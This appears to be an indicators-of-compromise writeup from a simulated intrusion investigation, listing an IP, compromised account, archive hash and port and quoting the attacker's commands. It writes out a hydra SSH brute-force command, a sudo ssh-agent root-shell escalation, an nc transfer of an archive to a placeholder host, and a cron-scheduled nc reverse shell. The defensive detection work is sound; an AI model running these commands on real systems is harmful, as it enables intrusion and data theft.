# Indicators of Compromise (IOC) Collection

## Overview

Indicators of compromise were collected during the investigation phase.

These indicators represent artifacts that could be used by defenders to identify similar malicious activity in future investigations.

The IOC collection includes:

- IP addresses
- User accounts
- File names
- Hashes
- Commands
- Processes
- Ports
- Persistence mechanisms

---

# IOC Table

| Type | Indicator | Description | Source |
|---|---|---|---|
| IP Address | 10.0.2.15 | Attacker communication address used during simulation | PCAP |
| User Account | auditor | Compromised SSH account | ssh.log |
| File | sensitive-data.7z | Sensitive archive accessed during attack | Process activity |
| Hash | fac98bb688c5c95082717b0e2d0cc702 | MD5 hash of collected archive | Command output |
| Port | 12345 | Reverse shell / transfer port | Network activity |
| Command | `nc -e /bin/sh` | Reverse shell command | Cron configuration |
| Persistence | Cron job | Scheduled reverse shell execution | root_cron.txt |
| Binary | `/usr/bin/ssh-agent` | Abused for privilege escalation | Process evidence |

---

# Command Indicators

The following commands were associated with attacker activity:

## Credential Attack

```
hydra -L probable-users.txt -P rockyou.txt <target> ssh
```

Purpose:

SSH credential brute force.

---

## Privilege Escalation

```
sudo /usr/bin/ssh-agent /bin/sh
```

Purpose:

Obtain root shell through sudo abuse.

---

## Data Exfiltration

```
nc <destination-ip> 12345 < sensitive-data.7z
```

Purpose:

Simulated outbound data transfer.

---

## Persistence

```
* * * * * nc -e /bin/sh <remote-ip> 12345
```

Purpose:

Scheduled reverse shell execution.

---

# IOC Export

The collected indicators were exported into:

```
ioc.csv
```

The CSV format allows future ingestion into:

- SIEM platforms
- Threat intelligence tools
- Detection pipelines
- Investigation workflows

---

# IOC Summary

| Category | Count |
|-|-|
| IP Addresses | 1 |
| Users | 1 |
| Files | 1 |
| Hashes | 1 |
| Commands | 4 |
| Persistence Mechanisms | 1 |

These indicators were used in later ATT&CK mapping and detection engineering exercises.